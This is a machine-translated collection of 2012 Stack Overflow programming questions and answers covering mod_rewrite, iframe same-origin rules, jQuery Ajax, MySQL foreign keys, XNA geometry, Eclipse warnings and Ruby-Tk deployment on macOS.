我有一个名为“public_html/hammer/”的目录（我的 CMS）。我想使用根“public_html/”上的图像文件夹。我可以简单地执行类似“../picture.jpg”的操作，但是“/hammer/”中的内容将显示在根目录中，因此当我查询 html 时它会被破坏。

如何编写将“public_html/hammer/images/”指向“public_html/images”的 ModRewrite 或类似内容？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-15T14:29:09.123

假设 public_html 是您的文档根目录，请在以下位置放置如下规则`public_html/.htaccess`：

```
RewriteEngine On
RewriteRule ^hammer/images/(.*)$ images/$1 [L] 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-15T14:26:59.260

基本上：

```
RewriteEngine on
RewriteRule ^.*$ ../../$1 [L] 
```

# sahi - sahi 脚本问题以记录弹出窗口的文本

> ID：11052590
> 
> 赞同：0
> 
> 时间：2012-06-15T14:24:50.523
> 
> 标签：sahi

如何在 sahi 中编写自定义脚本以在弹出窗口中记录文本框文本？拜托，有人建议我主文件，我可以在哪里编写用于 sahi 工具录制的自定义函数？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2015-04-17T10:52:27.983

对于弹出窗口，使用 _selectWindow() API。例如：

_selectWindow("/1/"); //这里在 Sahi 控制器中，您可以在前缀字段中看到弹出窗口 id，如果它是动态的，您也可以使用 id 作为正则表达式，就像我使用的那样。

_click(_span(15));

_selectWindow();

# iframe - iframe 可以从其父窗口读取多少数据？

> ID：11052595
> 
> 赞同：1
> 
> 时间：2012-06-15T14:25:10.997
> 
> 标签：iframe, same-origin-policy

如果我创建一个小部件并将其嵌入到`<iframe>`来自不同域的站点中，该小部件可以读取多少关于父页面的数据？

显然没有 DOM 访问权限，但是有没有其他信息的访问权限，比如父页面是否有父页面，或者父页面的 url 是什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-28T18:50:01.950

通常，从不同域提供的 iframe 的内容无法以任何方式访问父级。这就像在不同的浏览器选项卡中加载页面。

但是，即使从不同的域提供服务，也可能存在中间人攻击，这将允许访问父 DOM。这比听起来容易——任何对公共 WiFi 接入点具有管理控制权的人都可以实施这种攻击（想想星巴克、酒店、机场。）

可以使用 HTML5 iframe 沙盒属性来防止这种攻击——见下文。

中间人攻击的工作原理如下。假设您的页面从[http://yoursite.com](http://yoursite.com)加载，并且 iframe 转到[http://badsite.org](http://badsite.org)

*   第一个[http://badsite.org](http://badsite.org)重定向到[http://yoursite.com/badpage](http://yoursite.com/badpage)

*   这是需要中间人攻击的步骤。攻击者必须能够在用户和 yoursite.com 之间取得联系，或者控制您的 DNS 查找的答案。目标是从攻击者的站点提供[http://yoursite.com/badpage](http://yoursite.com/badpage)的内容，而不是您的实际站点。

*   然后，攻击者可以从（假的） [http://yoursite.org/badpage](http://yoursite.org/badpage)提供他们喜欢的任何恶意代码。因为它与主页面在同一个域中，所以它可以访问父 DOM。

HTML5 iframe 沙盒属性似乎是避免这种情况的方法。您可以阅读[规范](http://dev.w3.org/html5/spec-author-view/the-iframe-element.html#attr-iframe-sandbox)，但最好的描述可能在[这里](http://msdn.microsoft.com/en-us/hh563496.aspx)。

这似乎在[Chrome](http://blog.chromium.org/2010/05/security-in-depth-html5s-sandbox.html)、[IE10](http://msdn.microsoft.com/en-us/hh563496.aspx)、[FireFox](https://bugzilla.mozilla.org/show_bug.cgi?id=341604)、[Safari](http://www.apple.com/safari/features.html)上受支持。

规范说，如果*未*设置“allow-same-origin”属性，“内容将被视为来自唯一来源。” 这应该可以防止您的子 iframe 访问父 DOM 的任何部分，无论浏览器认为 URL 是什么。

Sandbox 还允许您禁用脚本、弹出窗口、更改顶级 URL 的功能以及其他功能。

* * *

## 回答 #2

> 赞同：-2
> 
> 时间：2012-06-15T14:29:16.860

我做了一点谷歌搜索，结果发现*如果内容是另一个域（同源策略），通常你无法访问 Iframe 的内部内容*，但是这里有[一篇文章](http://softwareas.com/cross-domain-communication-with-iframes)可以为你提供一些解决方法。

# unix - 如何重新配置 Boost？

> ID：11052601
> 
> 赞同：1
> 
> 时间：2012-06-15T14:25:22.713
> 
> 标签：unix, boost, shared-ptr, configure

我目前正在使用 boost 共享内存 api，需要通过在 interprocess/detail/workaround.hpp 中禁用 BOOST_INTERPROCESS_POSIX_SHARED_MEMORY_OBJECTS 来写入 /tmp 而不是 /var。

我有 undef 标志，但我的程序仍然写入 /var 而不是 /tmp。我还缺少一个额外的步骤吗？

# iphone - 在同一个 UIWebView 中使用本地资源和相对链接

> ID：11052605
> 
> 赞同：1
> 
> 时间：2012-06-15T14:25:42.440
> 
> 标签：iphone, ios, uiwebview, nsbundle

我有一个 WebView 的问题。我正在将 Html 字符串加载到 Web 视图中。作为基本 URL，我需要使用我的站点 URL（因为 html 中有一些相对链接，我无法修改它）。问题是我还需要使用一些存储在应用程序包中的图像和 css。因此，我正在使用此代码创建对本地资源的引用（结果字符串在 html 文件中用作 src）：

```
NSString *cssUrl = [NSString stringWithString:@"file:"]; 
cssUrl = [cssUrl stringByAppendingString:[[NSBundle mainBundle] resourcePath]];
cssUrl = [cssUrl stringByAppendingString:@"/story.css"]; 
```

然后我还添加了：

```
cssUrl = [cssUrl stringByReplacingOccurrencesOfString:@"/" withString:@"//"];
cssUrl = [cssUrl stringByReplacingOccurrencesOfString:@" " withString:@"%20"]; 
```

知道如何解决问题以及如何创建对可在 Web 视图中使用的文件的引用吗？谢谢

弗朗切斯科

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-25T16:27:16.207

似乎我试图做的事情是不可能的。要使用捆绑资源，您必须将 Web 视图的基本 URL 设置为资源路径。感谢大家的帮助

弗朗切斯科

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-15T14:41:08.703

首先，将一个目录，例如一个名为 的目录，导入`web`到所有文件所在的项目中。确保在 Xcode 询问您时选择“*为任何文件夹创建组引用”。*

现在，您可以将初始字符串放入其中的文件后，像这样加载它`web`，例如`index.html`：

```
NSString* path = [[NSBundle mainBundle] pathForResource:
   @"index" ofType:@"html" inDirectory:@"web"];
if (path) 
   [self.webView loadRequest:
     [NSURLRequest requestWithURL:[NSURL fileURLWithPath:path]]]; 
```

现在，您的字符串中的所有相对源 URL 都将按预期工作，包括`<img>`等`<a>`。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-15T15:37:46.860

这个怎么样？

```
NSString *resourcePath = [[NSBundle mainBundle] pathForResource:@"story" ofType:@"css"];
NSURL *url = [NSURL fileURLWithPath:resourcePath];
NSString *theMagicalURLString = [url absoluteString]; 
```

# javascript - 不断变化的 Div 中的 Ajax 调用

> ID：11052607
> 
> 赞同：0
> 
> 时间：2012-06-15T14:25:49.287
> 
> 标签：javascript, jquery, ajax

我正在处理我的第一个 Ajax 项目，但我找不到解决此问题的方法：

这是我的 Ajax 代码：

```
$(document).ready(function(){

var seite = $('div.ipadSeite');

$('a').on('click', function(e){
    var href = $(this).attr('href');

    seite.load( href );
    e.preventDefault(); 
}); 
```

});

这是 index.php：

```
....<div id="ipadHeader">
        <nav>
            <ul>
                <li>100% |=|</li>
                <li>
                    <?php 
                        echo date("h:i a");
                    ?> 
                </li>
                <li>TWT</li>
            </ul>
        </nav>
    </div>
    <div class="ipadSeite">
        <img src="../images/homescreen.png" id="homescreenImage" />
        <a href="seiten/1app.php"><div id="appIcon"><p>TWT</p></div></a>
    </div>
</div>.... 
```

首次启动应用程序时，链接：a href="seiten/1app.php 正在工作！所以我创建了一个主页按钮以返回 index.php。这是通过 Ajax 加载的文件以返回“主页” ：

```
 <img src="../images/homescreen.png" id="homescreenImage" />
<a href="informationen.php"><div id="appIcon"><p>TWT</p></div></a> 
```

它只是在“ipadSeite”中加载相同的内容。我的第一个问题：这是错的吧？它应该更容易吗？但是当链接到 index.php 时，它会加载整个站点（页眉、页脚 ..）并且功能会中断。

第二个问题：我的解决方案有效，但是当我再次单击该按钮时，它不会发出 Ajax 请求。相反，它会打开一个常规链接，但没有 CSS。我真的找不到任何解决方案。我希望你们理解我的问题和我的解释。

非常感谢你！凯文

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-15T15:20:07.127

代理功能：

```
$(document).delegate('a','click',function(){//Write your function here}) 
```

“开”我觉得很有情境。'Delegate' 和 'live' 都适用于异步加载元素。

罗伯特

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-15T14:31:32.547

据我粗略看一眼，您并没有使用 AJAX，而只是使用了 jQuery 的函数。

你到底想做什么？如果您逐点列出用户旅程是什么，那么我相信有人可以帮助您。

罗伯特

[编辑]

您是否尝试过访问主页上的特定部分：

```
<script>
  $("#new-nav").load("/ #jq-footerNavigation li");
</script> 
```

上面的代码说从主页'/'获取一些数据并将其加载到'#new-nav'元素中

在您的情况下，它应该是 .load('/ .ipadSeite' )

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-15T14:31:53.587

首先，我认为您在 id 中按类引用 div

var seite = $('div.ipadSeite'); => var seite = $('#ipadSeite');

# mysql - 主键和外键冲突

> ID：11052608
> 
> 赞同：0
> 
> 时间：2012-06-15T14:25:49.250
> 
> 标签：mysql, foreign-keys, primary-key, constraints

此插入在我的数据库上失败-

```
insert into tig_pairs (pkey, pval, uid) select 'schema-version', '4.0', uid from tig_users where (sha1_user_id = sha1(lower('db-properties')));
ERROR 1452 (23000): Cannot add or update a child row: a foreign key constraint fails (`tigasedb`.`tig_pairs`, CONSTRAINT `tig_pairs_constr_2` FOREIGN KEY (`nid`) REFERENCES `tig_nodes` (`nid`)) 
```

表定义在哪里：

```
create table if not exists tig_pairs (
   nid int unsigned,
   uid int unsigned NOT NULL,

   pkey varchar(255) NOT NULL,    
   pval mediumtext,

   PRIMARY KEY (nid, pkey),      --        ***
             key pkey (pkey),
         key uid (uid),
         key nid (nid),
         constraint tig_pairs_constr_1 foreign key (uid) references tig_users (uid),
         constraint tig_pairs_constr_2 foreign key (nid) references tig_nodes (nid)
)
ENGINE=InnoDB default character set utf8 ROW_FORMAT=DYNAMIC; 
```

和

```
create table if not exists tig_nodes (
   nid int unsigned NOT NULL auto_increment,
   parent_nid int unsigned,
   uid int unsigned NOT NULL,

   node varchar(255) NOT NULL,

   primary key (nid), 
   unique key tnode (parent_nid, uid, node),
   key node (node),
         key uid (uid),
         key parent_nid (parent_nid),
         constraint tig_nodes_constr foreign key (uid) references tig_users (uid)
)
ENGINE=InnoDB default character set utf8 ROW_FORMAT=DYNAMIC; 
```

该行`PRIMARY KEY (nid, pkey), -- ***`被省略，然后我的查询就可以通过了。该主键和令人不安的外键约束之间是否存在冲突？我怎样才能避免它？主键必须留在那里:)

谢谢！

编辑：通过在一行上更改 tig_pairs 定义来消除错误：

```
nid int unsigned NOT NULL auto_increment, 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-15T14:36:49.707

您在`tig_pairs`引用该`tig_nodes`表的表上有一个外部约束。但是，您没有将任何数据插入到 tis`nid`字段中。引用的字段 ,`tig_nodes.nid`不允许 NULL 值。由于这两个限制，您不能将 null 插入`nid`.`tig_pairs`

另请参阅此问题：[MySQL 外键允许 NULL？](https://stackoverflow.com/questions/441988/mysql-foreign-key-to-allow-null)

编辑：此外，主键值永远不允许为 NULL；因此，只要`nid`包含在该主键中，就不能将其设为 NULL。

# php - 另一个网站的预览不是 php 和 javascript 中的缩略图

> ID：11052612
> 
> 赞同：1
> 
> 时间：2012-06-15T14:26:01.263
> 
> 标签：php, javascript

我正在创建一个网站，访问者可以在其中预览（不是缩略图！）mypage 上输入文本框中的另一个 url，然后单击“预览”按钮-

我正在使用 php 中的 CURL 来提取网站的内容，并将我的页面分成两半，一个用于接受 url，另一半将显示预览的内容，基本上我不想要像 GOOGLE 这样的 url 网站的图像。

尽管 CURL 获取了我的内容并且我能够在预览中看到内容，但令人讨厌的是预览的 html 的 CSS 甚至在我的页面上都得到了应用 :( 因为我对 CSS 的了解非常有限，任何人都可以帮助我与以下

1.  预览部分的 css 不得应用于我的页面部分
2.  如何缩小预览站点以适应我页面的预览部分。

谢谢，杰

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-15T14:32:44.640

使用 iframe 将预览网站与您自己的网站分开。像这样的东西应该工作：

```
<iframe id="preview" src="about:blank"></iframe>

<script>
    function previewUrl(location) {
        document.getElementById('preview').src = location;
    }
</script> 
```

# xna - 使用旋转卡尺在 XNA 中寻找凸包的定向边界框

> ID：11052614
> 
> 赞同：6
> 
> 时间：2012-06-15T14:26:09.900
> 
> 标签：xna, rotation, computational-geometry, bounding-box, convex

也许这更像是一个数学问题而不是编程问题，但我一直在尝试在 XNA 中实现旋转卡尺算法。

我已经使用维基百科上详述的单调链从我的点集中推导出了一个凸包。

现在我正在尝试对我的算法进行建模，以在此处找到 OBB： [http ://www.cs.purdue.edu/research/technical_reports/1983/TR%2083-463.pdf](http://www.cs.purdue.edu/research/technical_reports/1983/TR%2083-463.pdf)

但是，我不明白它在最后一页提到的 DOTPR 和 CROSSPR 方法应该返回什么。

我了解如何获得两点的点积和两点的叉积，但似乎这些函数应该返回两条边/线段的点积和叉积。诚然，我的数学知识有限，但这是我对该算法正在寻找什么的最佳猜测

```
 public static float PolygonCross(List<Vector2> polygon, int indexA, int indexB)
    {
        var segmentA1 = NextVertice(indexA, polygon) - polygon[indexA];
        var segmentB1 = NextVertice(indexB, polygon) - polygon[indexB];

        float crossProduct1 = CrossProduct(segmentA1, segmentB1);
        return crossProduct1;
    }

    public static float CrossProduct(Vector2 v1, Vector2 v2)
    {
        return (v1.X * v2.Y - v1.Y * v2.X);
    }

    public static float PolygonDot(List<Vector2> polygon, int indexA, int indexB)
    {
        var segmentA1 = NextVertice(indexA, polygon) - polygon[indexA];
        var segmentB1 = NextVertice(indexB, polygon) - polygon[indexB];

        float dotProduct = Vector2.Dot(segmentA1, segmentB1);
        return dotProduct;
    } 
```

但是，当我按照我的这部分代码中的指示使用这些方法时......

```
 while (PolygonDot(polygon, i, j) > 0)
            {
                j = NextIndex(j, polygon);
            }

            if (i == 0)
            {
                k = j;
            }
            while (PolygonCross(polygon, i, k) > 0)
            {
                k = NextIndex(k, polygon);
            }

            if (i == 0)
            {
                m = k;
            }
            while (PolygonDot(polygon, i, m) < 0)
            {
                m = NextIndex(m, polygon);
            } 
```

..当我给它一组测试点时，它为 j, k 返回相同的索引：

```
 List<Vector2> polygon = new List<Vector2>() 
        { 
            new Vector2(0, 138),
            new Vector2(1, 138), 
            new Vector2(150, 110), 
            new Vector2(199, 68), 
            new Vector2(204, 63), 
            new Vector2(131, 0), 
            new Vector2(129, 0), 
            new Vector2(115, 14), 
            new Vector2(0, 138), 
        }; 
```

请注意，我调用 polygon.Reverse 以按照 perdue.edu 的技术文档中所示的逆时针顺序放置这些点。我的用于查找点集的凸包的算法会按逆时针顺序生成点列表，但假设 y < 0 高于 y > 0 因为当绘制到屏幕时，0,0 是左上角. 颠倒列表似乎就足够了。我还删除了最后的重复点。

经过这个过程，数据变成：

*   向量 2(115, 14)
*   向量2(129, 0)
*   向量2(131, 0)
*   向量 2(204, 63)
*   矢量2(199, 68)
*   向量 2(150, 110)
*   向量 2(1, 138)
*   向量 2(0, 138)

当 i 等于 0 且 j 等于 3 时，此测试在第一个循环中失败。它发现行 (115,14) 到 (204,63) 和行 (204,63) 到 (199,68) 的叉积) 为 0。然后发现同一行的点积也为 0，因此 j 和 k 共享相同的索引。

相反，当给定这个测试集时： [http ://www.wolframalpha.com/input/?i=polygon+%282%2C1%29%2C%281%2C2%29%2C%281%2C3%29%2C% 282%2C4%29%2C%284%2C4%29%2C%285%2C3%29%2C%283%2C1%29](http://www.wolframalpha.com/input/?i=polygon+%282%2C1%29%2C%281%2C2%29%2C%281%2C3%29%2C%282%2C4%29%2C%284%2C4%29%2C%285%2C3%29%2C%283%2C1%29)

我的代码成功返回此 OBB： [http ://www.wolframalpha.com/input/?i=polygon+%282.5%2C0.5%29%2C%280.5%2C2.5%29%2C%283%2C5%29% 2C%285%2C3%29](http://www.wolframalpha.com/input/?i=polygon+%282.5%2C0.5%29%2C%280.5%2C2.5%29%2C%283%2C5%29%2C%285%2C3%29)

我已经阅读了[http://www.geometrictools.com/LibMathematics/Containment/Wm5ContMinBox2.cpp](http://www.geometrictools.com/LibMathematics/Containment/Wm5ContMinBox2.cpp)上的 C++ 算法，但我太密集了，无法完全遵循它。它似乎也与上​​述论文中详述的另一个非常不同。

有谁知道我正在跳过哪个步骤或在我的代码中看到一些错误以查找两条线段的点积和叉积？有没有人在 C# 中成功实现过这段代码并有一个例子？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-14T17:07:29.623

点和向量作为数据结构本质上是一回事；两者都包含两个浮点数（如果您在三个维度上工作，则为三个）。因此，当被要求对边缘进行点积时，我想这意味着对边缘定义的向量进行点积。您提供的代码正是这样做的。

您的实现`CrossProduct`似乎是正确的（请参阅[Wolfram MathWorld](http://mathworld.wolfram.com/CrossProduct.html)）。但是，`PolygonCross`我`PolygonDot`认为您不应该对细分进行规范化。它将影响 和 的返回值的`PolygonDot`大小`PolygonCross`。通过删除对您的多余调用，`Vector2.Normalize`您可以加快代码速度并减少浮点值中的噪声量。但是，规范化与您粘贴的代码的正确性无关，因为它仅将结果与零进行比较。

请注意，您所指的论文假定多边形顶点按逆时针顺序列出（第 5 页，“评论开始”之后的第一段），但您的示例`polygon`是按顺​​时针顺序定义的。这就是为什么是负数并且你得到和`PolygonCross(polygon, 0, 1)`相同的值。`j``k`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-02T21:08:52.687

我假设 DOTPR 是一个法线向量点积，crosspr 是一个叉积。dotproduct 将返回一个正常的 number ， crossproduct 将返回一个与给定的两个向量垂直的向量。（基本矢量数学，查看维基百科）

它们实际上在论文中被定义为 DOTPR(i,j) 返回从顶点 i 到 i+1 和 j 到 j+1 的向量的点积。CROSSPR 相同，但有叉积。

# javascript - FF 中 iframe 的 javascript 错误

> ID：11052615
> 
> 赞同：2
> 
> 时间：2012-06-15T14:26:13.880
> 
> 标签：javascript

我有如下代码，

```
var contentFrame = window.document.getElementById("globalSearch");
var content = contentFrame.document.getElementById("globalSearch"); 
```

有人可以解释一下上面两行之间的区别。在 FF 我收到错误“contentFrame.document 未定义”

我的表格如下所示，

```
<form id="Search" action="<c:url value="/search" />" method="get">
<input .... />           
<iframe style="visibility : hidden;position : absolute;top : 0; border : 1px solid WindowFrame;"frameborder="0"            src="<c:url value="/search" />"
id="globalSearch" name="globalSearch"></iframe></form> 
```

无论如何我可以摆脱上述错误吗？如果有人给我在 jquery 中适用于所有浏览器的等效代码，我会很高兴。

再次感谢你！

* * *

实际上，在我的应用程序中，每个页面都使用了一个模板。模板具有页眉、页脚菜单 html。下面显示的表格在 header.html 中定义

```
<form id="Search" action="<c:url value="/search" />" method="get"> 
  <input .... />            
  <iframe style="visibility : hidden;position : absolute;top : 0; border : 1px solid WindowFrame;" frameborder="0" src="<c:url value="/search" />" id="globalSearch" name="globalSearch"></iframe>
</form> 
```

这就是代码引用 globalSearch iframe id（考虑为父页面的子元素）的原因，如下所示，

```
var contentFrame = window.document.getElementById("globalSearch"); 
var content = contentFrame.document.getElementById("globalSearch"); 
```

会`this->content=$(#globalSearch").contents();`在这种情况下工作吗？请说清楚。提前致谢。这是非常紧迫的。请帮忙。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-15T14:30:15.143

```
var contentFrame = window.document.getElementById("globalSearch");
var content = contentFrame.document.getElementById("globalSearch"); 
```

只有第一个陈述是有意义的；第二个依赖于第一个并且会`globalSearch`在 iframe 中搜索 id `globalSearch`。

顺便说一句，您可以稍微缩短第一条语句：

```
var contentFrame = document.getElementById('globalSearch') 
```

您无需指定`window`.

# .net - 无法从根目录加载 VB.NET 中的文件

> ID：11052621
> 
> 赞同：1
> 
> 时间：2012-06-15T14:26:45.287
> 
> 标签：.net, vb.net

我刚刚创建了我的第一个 .net 网站。我正在尝试使用以下代码行从当前目录加载文件（所有 Web 文件都在同一个目录中）。我收到一条错误消息，提示文件不存在

```
 InstallFormTemp = My.Computer.FileSystem.ReadAllText("installerform.html") 
```

我将文件复制到我的 c 驱动器并将行更改为

```
 InstallFormTemp = My.Computer.FileSystem.ReadAllText("c:\installerform.html") 
```

它起作用了，但是现在我的网站必须运行一个godaddy的网络服务器，所以我不能将东西保存在c盘中，只能保存我的web目录。

如何 `My.Computer.FileSystem.ReadAllText`从网站当前目录读取文件？？？？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-15T14:36:12.227

这里有一些方法可以帮助您 - MapPath() 和/或 PhysicalPath() 在这种情况下应该很有用。此页面提供概述：http: [//msdn.microsoft.com/en-us/library/ms178116.aspx](http://msdn.microsoft.com/en-us/library/ms178116.aspx)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-15T14:52:16.283

有几种方法，其中一种是

```
System.IO.Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "installerform.html") 
```

# internet-explorer - Internet Explorer 输入字段无法聚焦

> ID：11052623
> 
> 赞同：1
> 
> 时间：2012-06-15T14:26:48.947
> 
> 标签：internet-explorer, input, popup, boxy

我在网站中使用四四方方的模式弹出窗口。我有一个输入字段和旁边的按钮。当我单击该按钮时，会出现一个带有 iframe 的方形弹出窗口（您在输入中输入邮政编码，iframe 会为您搜索数据）。

当我单击弹出窗口中的按钮时，无论是哪个按钮或在弹出窗口中执行 javascript 的锚标记，然后我关闭弹出窗口，输入字段都不再可选择。它不是灰色的，所以它没有被禁用。它上面没有任何元素。当我在不单击按钮的情况下关闭弹出窗口时，输入字段很好（如果在首先打开弹出窗口之前很好）。更奇怪的是：当我过去循环浏览页面上的所有可选项目，并最终回到我的输入字段时。就像什么都没发生一样可以选择。我可以再次选择文本，再次输入，等等。

你猜怎么着。仅在 IE (7/8/9) 中。

有人知道什么..？

# java - eclipse中的serialVersionUID字段警告

> ID：11052627
> 
> 赞同：15
> 
> 时间：2012-06-15T14:27:05.787
> 
> 标签：java, serialization, awt, serialversionuid

我刚刚开始使用 AWT 并在其中制作了一个简单的程序，它工作正常，但它在 eclipse 中显示一条我不明白的警告消息：

> 可序列化类 TestGUI 未声明 long 类型的静态最终 serialVersionUID 字段

我知道警告消息与 AWT 无关，也没有必要发布我的整个代码，但是当我尝试制作代码的 SSCCE 时，警告也消失了。由于我不知道为什么会生成此警告，因此我不知道要在我的 SSCCE 中保留哪个部分。因此整个代码！

我的代码是：

```
import java.awt.Frame;
import java.awt.Graphics;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;

public class TestGUI extends Frame {
    /**
     * @param args
     */
    private int x = 50;
    private int y = 50;

    TestGUI(String s) {
        addWindowListener(new WindowAdapter() {
            public void windowClosing(WindowEvent we) {
                setVisible(false);
                System.exit(0);
            }
        });
        addMouseListener(new MouseAdapter() {
            public void mouseClicked(MouseEvent me) {
                x = me.getX();
                y = me.getY();
                repaint();
            }
        });
    }

    public void paint(Graphics g) {
        g.drawString("Hello Princess", 100, 100);
        g.drawString("Mouse clicked here", x, y);
    }

    public static void main(String[] args) {
        // TODO Auto-generated method stub
        TestGUI tg = new TestGUI("first");
        tg.setSize(500, 500);
        tg.setVisible(true);
    }

} 
```

提前谢谢！

* * *

## 回答 #1

> 赞同：30
> 
> 时间：2012-06-15T14:46:50.580

Eclipse 过去默认禁用该警告。在 Eclipse Indigo (3.7) 中，默认启用警告。您可以在 2 个位置更改设置，一个用于工作区中的所有内容，一个用于单个项目。

要禁用**工作区**中所有项目的警告，请转到 Window / Preferences 并打开 Java / Compiler / "Errors/Warnings" 选项卡，然后打开 "Potential programming problems"，然后将 "Serializable class without serialVersionUID" 的值更改为忽略（或任何你认为合适的）。

要禁用**单个项目**的警告，您可以右键单击项目，选择属性，然后转到 Java 编译器/“错误/警告”，单击启用项目特定设置（如果需要），然后选择“潜在编程问题”并将“Serializable class without serialVersionUID”的值更改为 Ignore（或您认为合适的任何值）。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-06-15T14:30:24.120

`TestGUI`extends`Frame`依次实现`Serializable`. 接口的一个要求`Serializable`是有一个`final long serialVersionUID`字段。有关更多信息，请参阅[Serializable javadoc](http://docs.oracle.com/javase/6/docs/api/java/io/Serializable.html)。

引用该 Javadoc 的重要部分：

```
...it is strongly recommended that all serializable classes explicitly declare
serialVersionUID values, since the default serialVersionUID computation is highly
sensitive to class details that may vary depending on compiler implementations... 
```

# ruby - 在 OS X 上部署 Ruby-Tk 应用程序

> ID：11052635
> 
> 赞同：3
> 
> 时间：2012-06-15T14:27:44.250
> 
> 标签：ruby, macos, deployment, tk

我正在寻找一种在 OS X 上部署独立 Ruby-Tk 桌面应用程序的简单方法。在 Mac 上部署桌面 Ruby GUI 应用程序的所有现有选项（例如standaloneify.rb）都假设您使用的是 RubyCocoa 或 MacRuby，并且是紧密绑定到 Xcode/Interface Builder 项目结构；或者，您正在通过 Platypus 包装一个不涉及部署整个 Ruby 运行时的简单脚本。我发现的其他现有选项——rubyscript2exe、ocra、crate——都不支持 Mac 和/或支持 Ruby 1.9。

我希望有人可以将我指向执行以下操作的 shell 脚本或 Ruby 脚本：

1.  跟踪应用程序中的所有依赖项/宝石。
2.  将 Ruby 解释器和依赖项复制到应用程序包中。
3.  在 Ruby 解释器和所有 dylib 上运行 install_name_tool 以使其可移植。

应用程序包可以是 Platypus 创建的东西，使用 Cocoa 存根启动器，甚至是 shell 脚本——我知道如何处理这些。我遇到的问题是以可移植的方式包装 Ruby 运行时。

[在http://weft-qda.rubyforge.org/svn/trunk/weft-qda/rake/rake_osx.rb](http://weft-qda.rubyforge.org/svn/trunk/weft-qda/rake/rake_osx.rb)有一个 rakefile，它包含了我想要完成的任务，但是这个 rakefile 是一个更大的构建的一部分我无法在我的 Mac 上运行的结构。我对 rakefile 结构不够熟悉，无法将其重构为一个可以通过“ruby rake_osx.rb”甚至“rake”运行的简单脚本。

如果有人可以向我建议如何修改这个 rakefile 以独立运行，或者将我指向另一个示例项目，甚至分享一些代码，我将不胜感激。我正在从事的项目比 Python 更适合 Ruby（Ruby 中更好的库支持），但如果部署不起作用，我不会在它上面投入时间。（Python 拥有比 Ruby 丰富得多的部署工具传统，这是我一直不太了解的。）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-12-06T05:56:41.810

事后这有点晚了，但是以经典的方式，因为我在 Mac 上找不到 Ruby-Tk 的桌面应用程序部署工具，所以我编写了自己的：

[ruby2app](https://github.com/codebykevin/ruby2app)

ruby2app 是一个简单的命令行工具，灵感来自于类似的 Mac 工具，如 Python 的 py2app，它将 Ruby 脚本与 Ruby 运行时捆绑到一个独立的 Mac 应用程序中。它读取一个基本配置文件以找到合适的 Ruby 安装，编译一个嵌入 Ruby 解释器的小型 C 程序，将整个 Ruby 安装复制到应用程序包中，并将相关库与主可执行文件重新链接。

它试图为 Mac 提供 ocra 和 exerb 为 Windows 提供的功能。希望这对其他人有用。

# ajax - 如何在 jQuery/ajax 调用中获取 div 的嵌套元素的 id

> ID：11052636
> 
> 赞同：0
> 
> 时间：2012-06-15T14:27:46.143
> 
> 标签：ajax, jquery

**Scenerio：**我有一些`foreach loop`像下面这样填充的div

```
<div id="div1"><input type="hidden" value="1"></div> 
```

我正在填充几个 div`div(1,2,3) as id`和`hidden input field with same ids`

在我的 jQuery/Ajax 调用中，我正在执行如下操作

```
$.ajax({
                type: 'get',
                url: 'URL to Server',
                data: 'id=' + $("#div"+ here I want to get the id of input tag); 
```

例如，如果我想获得`input filed with id="2"`如何获得它的 id ？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-15T14:32:24.690

如果我让你正确，那么你应该这样做

`data: 'id=' + $("#div2 input").attr('id')`

`$("#div2 input")`会给你嵌套的输入字段

# android - OpenGL中自己的drawImage / drawLine

> ID：11052637
> 
> 赞同：0
> 
> 时间：2012-06-15T14:27:46.587
> 
> 标签：android, opengl-es, buffer, vbo

我在我的 android 图形引擎中实现了一些本机 2D 绘图功能，但是当我观察我的程序的性能时，现在又出现了另一个问题。

目前我正在实现一个 drawLine/drawImage 函数。总之，绘制每个不同的线/图像有以下不同的值：

*   颜色
*   阿尔法值
*   线的宽度
*   旋转（仅适用于图像）
*   大小/比例（也适用于图像）
*   混合方法（减法、加法、法线阿尔法）

现在，当绘制 imageLine 时，我将 CPU 计算的 6 个顶点（2 个三角形）的顶点位置和 uv 值放入 Floatbuffer 中，并在传递绘图信息（颜色、alpha 等）后立即使用 drawArrays 绘制它.) 通过制服到着色器。我画图的时候，传完信息后直接画出预设的VBO。

我认识到的第一个事实是：当然，绘制图像比图像线快得多（因为 VBO），而且：我不能将顶点数据预先放入图像线的 VBO，因为图像线没有像普通图像那样的静态形状（不同的线长，不同的线宽以及 x1,y1 和 x2,y2 的顶点位置变化太频繁）这就是为什么我使用普通的 Floatbuffer，而不是 VBO。

所以我的问题是：管理图像和其他 2D 图形功能的最佳方式是什么。对我来说，引擎的用户能够在不损失太多性能的情况下绘制尽可能多的图像/2D 图形，这很重要。

您可以在此处找到用于绘制图像、图像线、矩形、四边形等的函数： [https ://github.com/Chrise55/LLama3D/blob/master/Llama3DLibrary/src/com/llama3d/object/graphics/image/ImageBase .java](https://github.com/Chrise55/LLama3D/blob/master/Llama3DLibrary/src/com/llama3d/object/graphics/image/ImageBase.java)

这是一个例子，它在许多图像上看起来如何（测试人工神经网络），它工作得很好，但是对于那么多图像来说已经有点慢了...... :( ![测试人工神经网络](../Images/cb6021bcb56d8f90a55a497b585974ba.png)

# javascript - jQuery .slideToggle() 函数不起作用

> ID：11052638
> 
> 赞同：-1
> 
> 时间：2012-06-15T14:27:48.027
> 
> 标签：javascript, jquery, html

